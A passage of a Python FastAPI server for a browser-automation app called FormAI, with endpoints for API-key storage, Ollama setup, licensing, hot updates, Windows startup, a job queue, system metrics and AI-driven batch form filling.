    sites_manager.update_site(site_id, {"fields": fields})

    return JSONResponse(content={"success": True, "field": fields[field_index]})

@app.post("/api/profiles/{profile_id}/add-field")
async def add_profile_field(profile_id: str, request: Request):
    """Add a new field to a profile"""
    data = await request.json()
    field_key = data.get("field_key")
    default_value = data.get("default_value", "")

    if not field_key:
        raise HTTPException(status_code=400, detail="field_key required")

    success = sites_manager.add_profile_field(profile_id, field_key, default_value)

    # Reload profiles
    load_profiles()

    return JSONResponse(content={"success": success, "field_key": field_key})

# =============================================================================
# API KEYS
# =============================================================================

@app.get("/api/api-keys")
async def get_api_keys():
    """Get available API keys configuration"""
    api_keys_dir = Path("api_keys")
    api_keys = {}

    if api_keys_dir.exists():
        for file in api_keys_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    key_data = json.load(f)
                    service_name = file.stem
                    api_keys[service_name] = {
                        "configured": bool(key_data.get("api_key") or key_data.get("key")),
                        "service": service_name,
                        "masked_key": key_data.get("api_key", "")[:8] + "..." if key_data.get("api_key") else ""
                    }
            except:
                pass

    return JSONResponse(content=api_keys)

@app.post("/api/api-keys")
async def save_api_key(request: Request):
    """Save API key or configuration for a service"""
    try:
        data = await request.json()
        service = data.get("service")
        api_key = data.get("api_key")

        if not service or not api_key:
            raise HTTPException(status_code=400, detail="Service and API key are required")

        # Create api_keys directory if it doesn't exist
        api_keys_dir = Path("api_keys")
        api_keys_dir.mkdir(exist_ok=True)

        # Save API key or URL (for Ollama)
        key_file = api_keys_dir / f"{service}.json"

        # For Ollama, store as base_url instead of api_key
        if service == 'ollama':
            key_data = {
                "service": service,
                "api_key": api_key,  # Store URL in api_key field for consistency
                "base_url": api_key,
                "updated_at": datetime.now().isoformat()
            }
        else:
            key_data = {
                "service": service,
                "api_key": api_key,
                "updated_at": datetime.now().isoformat()
            }

        with open(key_file, 'w', encoding='utf-8') as f:
            json.dump(key_data, f, indent=2)

        logger.info(f"API key saved for service: {service}")

        return JSONResponse(content={
            "success": True,
            "message": f"{'Configuration' if service == 'ollama' else 'API key'} saved for {service}",
            "service": service,
            "configured": True
        })

    except Exception as e:
        logger.error(f"Error saving API key: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/ollama/status")
async def get_ollama_status():
    """Check Ollama installation and running status"""
    try:
        installer = get_installer()
        status = installer.check_installation()

        # Add current model from .env
        current_model = os.getenv("OLLAMA_MODEL", "llama3.2")
        status["current_model"] = current_model

        return JSONResponse(content=status)
    except Exception as e:
        logger.error(f"Error checking Ollama status: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/ollama/install")
async def install_ollama(background_tasks: BackgroundTasks):
    """Trigger Ollama installation in background"""
    global ollama_installation_progress

    # Check if already installing
    if ollama_installation_progress["status"] == "installing":
        return JSONResponse(content={
            "success": False,
            "message": "Installation already in progress"
        })

    # Reset progress
    ollama_installation_progress = {

        "status": "installing",
        "percentage": 0,
        "message": "Starting installation...",
        "result": None
    }

    # Start installation in background
    async def run_installation():
        global ollama_installation_progress

        def progress_callback(status: str, percentage: int, message: str):
            ollama_installation_progress["status"] = status
            ollama_installation_progress["percentage"] = percentage
            ollama_installation_progress["message"] = message

        try:
            installer = get_installer(progress_callback)
            result = installer.install_complete()

            ollama_installation_progress["result"] = result
            if result["success"]:
                ollama_installation_progress["status"] = "complete"
                ollama_installation_progress["percentage"] = 100
                ollama_installation_progress["message"] = result["message"]
            else:
                ollama_installation_progress["status"] = "error"
                ollama_installation_progress["message"] = result["message"]

        except Exception as e:
            logger.error(f"Installation error: {e}", exc_info=True)
            ollama_installation_progress["status"] = "error"
            ollama_installation_progress["message"] = str(e)

    background_tasks.add_task(run_installation)

    return JSONResponse(content={
        "success": True,
        "message": "Installation started in background"
    })

@app.get("/api/ollama/install-progress")
async def get_install_progress():
    """Get current installation progress"""
    global ollama_installation_progress
    return JSONResponse(content=ollama_installation_progress)

@app.post("/api/ollama/download-model")
async def download_model(request: Request, background_tasks: BackgroundTasks):
    """Download a specific Ollama model"""
    global model_download_progress

    try:
        data = await request.json()
        model_name = data.get("model_name")

        if not model_name:
            raise HTTPException(status_code=400, detail="model_name is required")

        # Check if already downloading
        if model_name in model_download_progress and model_download_progress[model_name]["status"] == "downloading":
            return JSONResponse(content={
                "success": False,
                "message": "Model download already in progress"
            })

        # Initialize progress tracking
        model_download_progress[model_name] = {
            "status": "downloading",
            "percentage": 0,
            "message": "Starting download..."
        }

        # Start download in background
        async def run_download():
            global model_download_progress

            try:
                # Run ollama pull command
                process = subprocess.Popen(
                    ['ollama', 'pull', model_name],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1
                )

                # Monitor progress
                for line in process.stdout:
                    line = line.strip()
                    if line:
                        # Parse progress from ollama output
                        if 'pulling' in line.lower():
                            model_download_progress[model_name]["message"] = line
                        elif '%' in line:
                            # Try to extract percentage
                            try:
                                percent_str = line.split('%')[0].split()[-1]
                                percentage = int(float(percent_str))
                                model_download_progress[model_name]["percentage"] = percentage
                                model_download_progress[model_name]["message"] = line
                            except:
                                model_download_progress[model_name]["message"] = line

                process.wait()

                if process.returncode == 0:
                    model_download_progress[model_name]["status"] = "complete"
                    model_download_progress[model_name]["percentage"] = 100
                    model_download_progress[model_name]["message"] = "Download complete"
                else:
                    model_download_progress[model_name]["status"] = "error"
                    model_download_progress[model_name]["message"] = "Download failed"

            except Exception as e:
                logger.error(f"Model download error: {e}", exc_info=True)
                model_download_progress[model_name]["status"] = "error"
                model_download_progress[model_name]["message"] = str(e)

        background_tasks.add_task(run_download)

        return JSONResponse(content={
            "success": True,
            "message": f"Started downloading {model_name}"
        })

    except Exception as e:
        logger.error(f"Error starting model download: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/ollama/download-progress")
async def get_download_progress(model: str):
    """Get download progress for a specific model"""
    global model_download_progress

    if model not in model_download_progress:
        return JSONResponse(content={
            "status": "not_started",
            "percentage": 0,
            "message": "Download not started"
        })

    return JSONResponse(content=model_download_progress[model])

@app.post("/api/ollama/set-model")
async def set_model(request: Request):
    """Set the active Ollama model in .env"""
    try:
        data = await request.json()
        model_name = data.get("model_name")

        if not model_name:
            raise HTTPException(status_code=400, detail="model_name is required")

        # Check if model is installed
        installer = get_installer()
        status = installer.check_installation()

        if not status["installed"] or not status["running"]:
            raise HTTPException(status_code=400, detail="Ollama is not installed or not running")

        if model_name not in status["models_available"]:
            raise HTTPException(
                status_code=400,
                detail=f"Model {model_name} is not installed. Please download it first."
            )

        # Update .env file
        env_path = Path(".env")
        if env_path.exists():
            # Read current .env
            with open(env_path, 'r') as f:
                env_lines = f.readlines()

            # Update or add OLLAMA_MODEL
            found = False
            for i, line in enumerate(env_lines):
                if line.startswith("OLLAMA_MODEL="):
                    env_lines[i] = f"OLLAMA_MODEL={model_name}\n"
                    found = True
                    break

            if not found:
                env_lines.append(f"\nOLLAMA_MODEL={model_name}\n")

            # Write back
            with open(env_path, 'w') as f:
                f.writelines(env_lines)
        else:
            # Create .env file
            with open(env_path, 'w') as f:
                f.write(f"OLLAMA_MODEL={model_name}\n")

        # Update environment variable in current process
        os.environ["OLLAMA_MODEL"] = model_name

        return JSONResponse(content={
            "success": True,
            "message": f"Active model set to {model_name}"
        })

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error setting model: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/status")
async def get_status():
    """Get server status including update info"""
    status = {
        "status": "running",
        "version": __version__,
        "profiles_count": len(profiles),
        "active_sessions": len(active_sessions),
        "websocket_connections": len(websocket_connections)
    }

    # Add update info if available
    try:
        from tools.auto_updater import updater
        update_status = updater.get_status()
        status["update"] = {
            "available": update_status["update_available"],
            "ready": update_status["update_ready"],
            "latest_version": update_status["latest_version"],
            "pending_version": update_status["pending_version"]
        }
    except Exception:
        status["update"] = {"available": False, "ready": False}

    return JSONResponse(content=status)


# Hot Update Endpoints - Update tools/data without new exe

@app.get("/api/updates/check")
async def check_hot_updates():
    """Check for available hot updates (tools, sites, web)"""
    try:
        from tools.hot_updater import hot_updater
        updates = await hot_updater.check_for_updates()
        return {
            "updates": updates,
            "total": sum(len(files) for files in updates.values()),
            "status": hot_updater.get_status()
        }
    except Exception as e:
        logger.error(f"Hot update check failed: {e}")
        return {"error": str(e), "updates": {}}

@app.post("/api/updates/apply")
async def apply_hot_updates(categories: List[str] = None):
    """Apply available hot updates"""
    try:
        from tools.hot_updater import hot_updater
        applied = await hot_updater.apply_updates(categories)
        return {
            "applied": applied,
            "total": sum(len(files) for files in applied.values()),
            "status": hot_updater.get_status()
        }
    except Exception as e:
        logger.error(f"Hot update apply failed: {e}")
        return {"error": str(e), "applied": {}}

@app.get("/api/updates/status")
async def get_hot_update_status():
    """Get hot update status"""
    try:
        from tools.hot_updater import hot_updater
        return hot_updater.get_status()
    except Exception as e:
        return {"error": str(e)}


# License Management Endpoints

class LicenseKeyRequest(BaseModel):
    license_key: str

@app.get("/api/license")
async def get_license_status():
    """Get current license status"""
    return JSONResponse(content={
        "valid": license_state["valid"],
        "status": license_state["status"],
        "message": license_state["message"],
        "tier": license_state["tier"],
        "expires_at": license_state["expires_at"],
        "license_key": admin_callback.license_key[:15] + "..." if admin_callback.license_key else None,
        "machine_id": admin_callback.machine_id
    })

@app.post("/api/license")
async def set_license_key(request: LicenseKeyRequest):
    """Set or update license key"""
    try:
        license_key = request.license_key.strip().upper()

        # Validate format
        if not license_key.startswith("FORMAI-"):
            raise HTTPException(
                status_code=400,
                detail="Invalid license key format. Key must start with 'FORMAI-'"
            )

        # Check if it matches expected format: FORMAI-XXXX-XXXX-XXXX-XXXX
        parts = license_key.split("-")
        if len(parts) != 5 or not all(len(p) == 4 for p in parts[1:]):
            raise HTTPException(
                status_code=400,
                detail="Invalid license key format. Expected: FORMAI-XXXX-XXXX-XXXX-XXXX"
            )

        # Save the license key
        if admin_callback.save_license_key(license_key):
            logger.info(f"License key updated: {license_key[:15]}...")

            # Trigger immediate heartbeat to validate
            asyncio.create_task(admin_callback.send_heartbeat())

            return JSONResponse(content={
                "success": True,
                "message": "License key saved. Validating with server...",
                "license_key": license_key[:15] + "..."
            })
        else:
            raise HTTPException(
                status_code=500,
                detail="Failed to save license key"
            )

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error setting license key: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.delete("/api/license")
async def remove_license_key():
    """Remove the current license key"""
    global license_state

    try:
        # Remove license file
        if admin_callback.LICENSE_FILE.exists():
            admin_callback.LICENSE_FILE.unlink()

        # Clear in-memory state
        admin_callback.license_key = None
        admin_callback.license_valid = False
        admin_callback.license_status = "removed"

        license_state = {
            "valid": False,
            "status": "removed",
            "message": "License key removed",
            "tier": None,
            "expires_at": None
        }

        logger.info("License key removed")

        return JSONResponse(content={
            "success": True,
            "message": "License key removed"
        })

    except Exception as e:
        logger.error(f"Error removing license key: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


# =============================================================================
# WINDOWS STARTUP SETTINGS
# =============================================================================

@app.get("/api/settings/startup")
async def get_startup_settings():
    """Get Windows startup settings"""
    if sys.platform != "win32":
        return JSONResponse(content={
            "available": False,
            "message": "Windows startup only available on Windows"
        })

    try:
        from tools.windows_startup import is_registered, get_startup_command
        from tools.windows_tray import is_tray_available

        return JSONResponse(content={
            "available": True,
            "enabled": is_registered(),
            "command": get_startup_command(),
            "tray_available": is_tray_available()
        })
    except ImportError as e:
        return JSONResponse(content={
            "available": False,
            "message": f"Windows startup modules not available: {e}"
        })
    except Exception as e:
        logger.error(f"Error getting startup settings: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/settings/startup/enable")
async def enable_startup():
    """Enable Windows startup (run at boot in background)"""
    if sys.platform != "win32":
        raise HTTPException(status_code=400, detail="Windows startup only available on Windows")

    try:
        from tools.windows_startup import register_startup, is_registered

        if register_startup(background=True):
            return JSONResponse(content={
                "success": True,
                "enabled": True,
                "message": "FormAI will now start automatically with Windows"
            })
        else:
            raise HTTPException(status_code=500, detail="Failed to register startup")

    except ImportError:
        raise HTTPException(status_code=500, detail="Windows startup module not available")
    except Exception as e:
        logger.error(f"Error enabling startup: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/settings/startup/disable")
async def disable_startup():
    """Disable Windows startup"""
    if sys.platform != "win32":
        raise HTTPException(status_code=400, detail="Windows startup only available on Windows")

    try:
        from tools.windows_startup import unregister_startup

        if unregister_startup():
            return JSONResponse(content={
                "success": True,
                "enabled": False,
                "message": "FormAI will no longer start automatically with Windows"
            })
        else:
            raise HTTPException(status_code=500, detail="Failed to unregister startup")

    except ImportError:
        raise HTTPException(status_code=500, detail="Windows startup module not available")
    except Exception as e:
        logger.error(f"Error disabling startup: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))


# WebSocket endpoint
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket for real-time updates"""
    await websocket.accept()
    websocket_connections.append(websocket)

    try:
        # Send initial connection message
        await websocket.send_json({
            "type": "connected",
            "message": "WebSocket connected"
        })

        # Keep connection alive
        while True:
            data = await websocket.receive_text()
            # Echo back or handle commands
            await websocket.send_json({
                "type": "echo",
                "data": data
            })

    except WebSocketDisconnect:
        if websocket in websocket_connections:
            websocket_connections.remove(websocket)
    except Exception as e:
        # Silently handle websocket errors - they're expected during normal operation
        if websocket in websocket_connections:
            websocket_connections.remove(websocket)

# Add automation runner function
async def run_automation(session_id: str, url: str):
    """Run the automation process"""
    if session_id not in active_sessions:
        return

    automation = active_sessions[session_id]

    try:
        await broadcast_message({
            "type": "automation_started",
            "session_id": session_id,
            "url": url
        })

        # Start browser and navigate
        success = await automation.start(url)

        if success:
            # Detect and fill forms
            fields_filled = await automation.detect_and_fill_forms()

            # Take screenshot
            screenshot = await automation.take_screenshot()

            await broadcast_message({
                "type": "automation_completed",
                "session_id": session_id,
                "fields_filled": fields_filled,
                "screenshot": screenshot
            })
        else:
            await broadcast_message({
                "type": "automation_failed",
                "session_id": session_id,
                "error": "Failed to start browser"
            })

    except Exception as e:
        await broadcast_message({
            "type": "automation_error",
            "session_id": session_id,
            "error": str(e)
        })
    finally:
        # Keep session open for further commands
        pass

@app.post("/api/automation/stop")
async def stop_all_automation():
    """Stop all active automation sessions"""
    stopped_sessions = []

    for session_id in list(active_sessions.keys()):
        try:
            automation = active_sessions[session_id]
            await automation.close()
            del active_sessions[session_id]
            stopped_sessions.append(session_id)
        except Exception:
            # Silently ignore errors when stopping sessions (may already be stopped)
            pass

    if stopped_sessions:
        await broadcast_message({
            "type": "automation_stopped",
            "sessions": stopped_sessions
        })

    return JSONResponse(content={
        "message": "Automation stopped",
        "sessions_stopped": len(stopped_sessions)
    })

@app.post("/api/automation/stop/{session_id}")
async def stop_automation(session_id: str):
    """Stop a specific automation session"""
    if session_id not in active_sessions:
        raise HTTPException(status_code=404, detail="Session not found")

    automation = active_sessions[session_id]
    await automation.close()
    del active_sessions[session_id]

    await broadcast_message({
        "type": "automation_stopped",
        "session_id": session_id
    })

    return JSONResponse(content={"message": "Automation stopped"})

# Static file serving (works in both dev and PyInstaller bundle)
app.mount("/static", StaticFiles(directory=str(BASE_PATH / "static")), name="static")
app.mount("/web", StaticFiles(directory=str(BASE_PATH / "web")), name="web")

def show_startup_animation():
    """Display cool startup animation with Gemini-style typewriter effect"""
    import time
    from colorama import Fore, Style, init
    init()

    def typewriter(text, delay=0.02, color="", end="\n"):
        """Print text with typewriter effect like Gemini CLI"""
        for char in text:
            print(f"{color}{char}{Style.RESET_ALL}", end='', flush=True)
            time.sleep(delay)
        print(end=end)

    # Clear screen (cross-platform)
    system = platform.system()
    clear_cmd = "clear" if system == "Linux" else "cls"
    os.system(clear_cmd)

    # Large KPR ASCII art banner
    kpr_banner = """
██╗  ██╗██████╗ ██████╗
██║ ██╔╝██╔══██╗██╔══██╗
█████╔╝ ██████╔╝██████╔╝
██╔═██╗ ██╔═══╝ ██╔══██╗
██║  ██╗██║     ██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
"""

    for line in kpr_banner.strip().split('\n'):
        typewriter(line, 0.005, Fore.CYAN)

    print()
    typewriter("Browser Automation Platform", 0.015, Fore.CYAN)
    print()

    # Loading steps with typewriter effect and faster delays
    steps = [
        ("Initializing browser engine", 0.1),
        ("Loading automation modules", 0.08),
        ("Preparing AI field mapper", 0.08),
        ("Starting web server", 0.12),
        ("Configuring network", 0.08),
        ("Establishing secure connections", 0.08),
        ("Ready to launch", 0.1)
    ]

    for step, delay in steps:
        typewriter(f"▶ {step}...", 0.015, Fore.GREEN, end='')
        time.sleep(delay)
        print(f" {Fore.GREEN}[OK]{Style.RESET_ALL}")


def scan_hardware_capabilities():
    """Scan hardware at startup to determine AI agent scaling capabilities."""
    import psutil
    from colorama import Fore, Style, init
    init()

    print()
    print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Style.RESET_ALL}          {Fore.YELLOW}SYSTEM CAPABILITY SCAN{Style.RESET_ALL}                           {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print()

    # CPU Info
    cpu_count = psutil.cpu_count(logical=True)
    cpu_physical = psutil.cpu_count(logical=False)
    cpu_freq = psutil.cpu_freq()
    cpu_percent = psutil.cpu_percent(interval=0.5)

    print(f"  {Fore.GREEN}CPU:{Style.RESET_ALL}")
    print(f"    • Cores: {cpu_physical} physical, {cpu_count} logical")
    if cpu_freq:
        print(f"    • Speed: {cpu_freq.current:.0f} MHz (max: {cpu_freq.max:.0f} MHz)")
    print(f"    • Current Load: {cpu_percent}%")

    # Memory Info
    memory = psutil.virtual_memory()
    memory_total_gb = memory.total / (1024**3)
    memory_available_gb = memory.available / (1024**3)
    memory_used_percent = memory.percent

    print(f"\n  {Fore.GREEN}MEMORY:{Style.RESET_ALL}")
    print(f"    • Total: {memory_total_gb:.1f} GB")
    print(f"    • Available: {memory_available_gb:.1f} GB ({100-memory_used_percent:.0f}% free)")

    # Network Info
    try:
        net_io = psutil.net_io_counters()
        print(f"\n  {Fore.GREEN}NETWORK:{Style.RESET_ALL}")
        print(f"    • Bytes Sent: {net_io.bytes_sent / (1024**2):.1f} MB")
        print(f"    • Bytes Received: {net_io.bytes_recv / (1024**2):.1f} MB")
    except Exception:
        pass

    # Calculate AI Agent Capacity
    # Conservative: Each browser uses ~300MB RAM and ~10% CPU per core
    max_agents_by_memory = int(memory_available_gb * 1024 / 300)  # 300MB per agent
    max_agents_by_cpu = int((100 - cpu_percent) / 15 * (cpu_count / 2))  # 15% CPU per agent

    # Limit to reasonable bounds
    max_parallel_agents = min(max_agents_by_memory, max_agents_by_cpu, 10)
    max_parallel_agents = max(1, max_parallel_agents)

    # Determine tier
    if max_parallel_agents >= 5:
        tier = "BEAST MODE"
        tier_color = Fore.GREEN
        tier_emoji = "[MAX]"
    elif max_parallel_agents >= 3:
        tier = "TURBO"
        tier_color = Fore.CYAN
        tier_emoji = "[FAST]"
    elif max_parallel_agents >= 2:
        tier = "STANDARD"
        tier_color = Fore.YELLOW
        tier_emoji = "[OK]"
    else:
        tier = "ECO"
        tier_color = Fore.RED
        tier_emoji = "[SLOW]"

    print(f"\n  {Fore.GREEN}AI AGENT CAPACITY:{Style.RESET_ALL}")
    print(f"    • Max Parallel Agents: {max_parallel_agents}")
    print(f"    • Performance Tier: {tier_color}{tier_emoji} {tier}{Style.RESET_ALL}")

    # Recommendations
    if max_parallel_agents >= 3:
        sites_per_hour = max_parallel_agents * 30  # ~2 min per site
        print(f"    • Estimated Speed: ~{sites_per_hour} sites/hour")
    else:
        print(f"    • Recommendation: Close other applications for better performance")

    print()
    print(f"{Fore.CYAN}════════════════════════════════════════════════════════════{Style.RESET_ALL}")
    print()

    return {
        "cpu_cores": cpu_count,
        "cpu_physical": cpu_physical,
        "cpu_percent": cpu_percent,
        "memory_total_gb": memory_total_gb,
        "memory_available_gb": memory_available_gb,
        "max_parallel_agents": max_parallel_agents,
        "performance_tier": tier
    }

    print()
    typewriter("━" * 54, 0.005, Fore.CYAN)
    typewriter("[OK] Server running on http://localhost:5511", 0.02, Fore.GREEN)
    typewriter("[!] Close this window to stop FormAI", 0.02, Fore.YELLOW)
    typewriter("━" * 54, 0.005, Fore.CYAN)
    print()

# ==================== Job Queue API ====================
# These endpoints are for the Docker-based job queue system

try:
    from core.queue_manager import get_queue_manager
    from core.job_models import Job, JobSubmitRequest, JobStats
    REDIS_ENABLED = True
except ImportError:
    REDIS_ENABLED = False
    # Define dummy classes if imports fail
    class JobSubmitRequest(BaseModel):
        profile_id: str
        recording_id: str
        count: int = 1

@app.get("/api/jobs/stats")
async def get_job_stats():
    """Get job queue statistics"""
    if not REDIS_ENABLED:
        return JSONResponse(content={"error": "Redis not configured"}, status_code=503)
    try:
        queue = get_queue_manager()
        if not queue.is_connected():
            return JSONResponse(content={"error": "Redis not connected"}, status_code=503)
        stats = queue.get_stats()
        return stats.model_dump()
    except Exception as e:
        return JSONResponse(content={"error": str(e)}, status_code=500)

@app.get("/api/jobs/workers")
async def get_workers():
    """Get list of active workers"""
    if not REDIS_ENABLED:
        return JSONResponse(content=[], status_code=200)
    try:
        queue = get_queue_manager()
        workers = queue.get_workers()
        return workers
    except Exception as e:
        return JSONResponse(content={"error": str(e)}, status_code=500)

@app.get("/api/jobs/recent")
async def get_recent_jobs():
    """Get recent jobs (completed + failed)"""
    if not REDIS_ENABLED:
        return JSONResponse(content=[], status_code=200)
    try:
        queue = get_queue_manager()
        jobs = queue.get_recent_jobs(limit=50)
        return jobs
    except Exception as e:
        return JSONResponse(content={"error": str(e)}, status_code=500)

@app.get("/api/jobs/{job_id}")
async def get_job_details(job_id: str):
    """Get details for a specific job"""
    if not REDIS_ENABLED:
        raise HTTPException(status_code=503, detail="Redis not configured")
    try:
        queue = get_queue_manager()
        details = queue.get_job_details(job_id)
        if not details:
            raise HTTPException(status_code=404, detail="Job not found")
        return details
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/jobs")
async def submit_job(request: JobSubmitRequest):
    """Submit one or more jobs to the queue"""
    if not REDIS_ENABLED:
        raise HTTPException(status_code=503, detail="Redis not configured")
    try:
        queue = get_queue_manager()
        if not queue.is_connected():
            raise HTTPException(status_code=503, detail="Redis not connected")

        job_ids = []
        for _ in range(request.count):
            job = Job(
                profile_id=request.profile_id,
                recording_id=request.recording_id,
                target_url=request.target_url
            )
            job_id = queue.add_job(job)
            job_ids.append(job_id)

        return {"success": True, "job_ids": job_ids, "count": len(job_ids)}
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Route for jobs dashboard page
@app.get("/jobs")
async def jobs_page():
    """Serve the jobs dashboard page"""
    return FileResponse(str(BASE_PATH / "web" / "jobs.html"))

# ============================================
# AI Agent Endpoints
# ============================================

class AIAgentRequest(BaseModel):
    """Request for AI agent form filling"""
    url: str
    profile_id: str
    headless: bool = False  # Visible so client can watch
    isolate_form: bool = False  # Remove everything except the form

class AIAgentBatchRequest(BaseModel):
    """Request for batch AI agent form filling"""
    urls: list
    profile_id: str
    headless: bool = False  # Visible so client can watch
    isolate_form: bool = False  # Remove everything except the form
    limit: int = 0  # 0 = no limit
    parallel: bool = False  # Enable parallel processing
    max_parallel: int = 0  # 0 = auto-detect based on system resources

# Global agent state
ai_agent_state = {
    "running": False,
    "current_site": None,
    "progress": {}
}

@app.get("/api/ai-agent/status")
async def get_ai_agent_status():
    """Check AI agent and Ollama status"""
    try:
        from tools.ollama_agent import OllamaAgent
        from tools.agent_memory import AgentMemory

        ollama = OllamaAgent()
        memory = AgentMemory()

        available = await ollama.check_available()
        stats = memory.get_stats()

        return JSONResponse(content={
            "ollama_available": available,
            "model": ollama.model,
            "agent_running": ai_agent_state["running"],
            "current_site": ai_agent_state["current_site"],
            "memory_stats": stats
        })
    except Exception as e:
        logger.error(f"Failed to get AI agent status: {e}")
        return JSONResponse(content={
            "ollama_available": False,
            "model": "unknown",
            "error": str(e)
        })


@app.get("/api/system/metrics")
async def get_system_metrics():
    """Get real-time system metrics for dashboard display"""
    try:
        from tools.system_monitor import SystemMonitorAgent

        monitor = SystemMonitorAgent()
        metrics = monitor.get_system_metrics()
        scaling = monitor.can_spawn_more_agents(ai_agent_state.get("active_agents", 0))

        return JSONResponse(content={
            "cpu_percent": metrics.get("cpu_percent", 0),
            "memory_percent": metrics.get("memory_percent", 0),
            "memory_available_mb": metrics.get("memory_available_mb", 0),
            "memory_total_mb": metrics.get("memory_available_mb", 0) / (1 - metrics.get("memory_percent", 1) / 100) if metrics.get("memory_percent", 0) < 100 else 0,
            "process_memory_mb": metrics.get("process_memory_mb", 0),
            "active_threads": metrics.get("active_threads", 0),
            "browser_processes": metrics.get("browser_processes", 0),
            "network_bytes_sent": metrics.get("network_bytes_sent", 0),
            "network_bytes_recv": metrics.get("network_bytes_recv", 0),
            "active_agents": ai_agent_state.get("active_agents", 0),
            "can_scale": scaling.get("can_spawn", False),
            "max_additional_agents": scaling.get("max_additional", 0),
            "max_parallel": scaling.get("recommended", 2) + ai_agent_state.get("active_agents", 0),
            "scaling_reason": scaling.get("reason", ""),
            "timestamp": metrics.get("timestamp", "")
        })
    except Exception as e:
        logger.error(f"Failed to get system metrics: {e}")
        return JSONResponse(content={
            "error": str(e),
            "cpu_percent": 0,
            "memory_percent": 0
        })


@app.websocket("/ws/metrics")
async def websocket_metrics(websocket: WebSocket):
    """WebSocket endpoint for real-time system metrics push"""
    await websocket.accept()

    try:
        from tools.system_monitor import SystemMonitorAgent
        monitor = SystemMonitorAgent()

        while True:
            metrics = monitor.get_system_metrics()
            scaling = monitor.can_spawn_more_agents(ai_agent_state.get("active_agents", 0))

            await websocket.send_json({
                "type": "system_metrics",
                "data": {
                    "cpu_percent": metrics.get("cpu_percent", 0),
                    "memory_percent": metrics.get("memory_percent", 0),
                    "memory_available_mb": metrics.get("memory_available_mb", 0),
                    "active_threads": metrics.get("active_threads", 0),
                    "browser_processes": metrics.get("browser_processes", 0),
                    "active_agents": ai_agent_state.get("active_agents", 0),
                    "can_scale": scaling.get("can_spawn", False),
                    "max_additional_agents": scaling.get("max_additional", 0),
                    "max_parallel": scaling.get("recommended", 2) + ai_agent_state.get("active_agents", 0)
                }
            })

            await asyncio.sleep(2)  # Update every 2 seconds

    except WebSocketDisconnect:
        pass
    except Exception as e:
        logger.error(f"Metrics WebSocket error: {e}")
    finally:
        try:
            await websocket.close()
        except Exception:
            pass

@app.post("/api/ai-agent/fill")
async def ai_agent_fill_site(request: AIAgentRequest):
    """Fill a single site using AI agent"""
    global ai_agent_state

    if ai_agent_state["running"]:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Agent already running"}
        )

    try:
        # Load profile
        if request.profile_id not in profiles:
            raise HTTPException(status_code=404, detail="Profile not found")

        profile = profiles[request.profile_id]
        profile_data = profile.get('data', profile)

        from tools.seleniumbase_agent import SeleniumBaseAgent

        ai_agent_state["running"] = True
        ai_agent_state["current_site"] = request.url

        try:
            agent = SeleniumBaseAgent(
                headless=request.headless,
                hold_open=10,
                isolate_form=request.isolate_form
            )

            # Send start notification via WebSocket
            await broadcast_message({
                "type": "ai_agent_action",
                "data": {"action": "starting", "url": request.url}
            })

            result = await agent.fill_site(request.url, profile_data)

            # Send completion via WebSocket
            await broadcast_message({
                "type": "ai_agent_complete",
                "data": result
            })

            return JSONResponse(content={
                "success": result.get("success", False),
                "result": result
            })

        finally:
            ai_agent_state["running"] = False
            ai_agent_state["current_site"] = None

    except Exception as e:
        logger.error(f"AI agent error: {e}", exc_info=True)
        ai_agent_state["running"] = False
        return JSONResponse(
            status_code=500,
            content={"success": False, "error": str(e)}
        )

@app.post("/api/ai-agent/fill-batch")
async def ai_agent_fill_batch(request: AIAgentBatchRequest, background_tasks: BackgroundTasks):
    """Fill multiple sites using AI agent"""
    global ai_agent_state

    if ai_agent_state["running"]:
        return JSONResponse(
            status_code=400,
            content={"success": False, "error": "Agent already running"}
        )

    try:
        # Load profile
        if request.profile_id not in profiles:
            raise HTTPException(status_code=404, detail="Profile not found")

        profile = profiles[request.profile_id]
        profile_data = profile.get('data', profile)

        # Apply limit if specified
        urls = request.urls
        if request.limit > 0:
            urls = urls[:request.limit]

        async def run_batch():
            global ai_agent_state
            logger.info("[AI Agent] Starting batch run...")

            try:
                from tools.seleniumbase_agent import SeleniumBaseAgent
                logger.info("[AI Agent] SeleniumBaseAgent imported successfully")
            except Exception as import_err:
                logger.error(f"[AI Agent] Failed to import SeleniumBaseAgent: {import_err}")
                await broadcast_message({
                    "type": "ai_agent_error",
                    "data": {"error": f"Import error: {import_err}"}
                })
                return

            ai_agent_state["running"] = True
            ai_agent_state["progress"] = {
                "total": len(urls),
                "completed": 0,
                "successful": 0,
                "failed": 0
            }

            try:
                logger.info(f"[AI Agent] Creating SeleniumBaseAgent (headless={request.headless})...")
                agent = SeleniumBaseAgent(
                    headless=request.headless,
                    hold_open=5,
                    isolate_form=request.isolate_form
                )
                logger.info("[AI Agent] Agent created, starting fill_sites...")

                async def on_progress(info):
                    if info["type"] == "site_complete":
                        ai_agent_state["progress"]["completed"] += 1
                        if info["result"].get("success"):
                            ai_agent_state["progress"]["successful"] += 1
                        else:
                            ai_agent_state["progress"]["failed"] += 1

                        # Check for missing fields from the crew (self-learning)
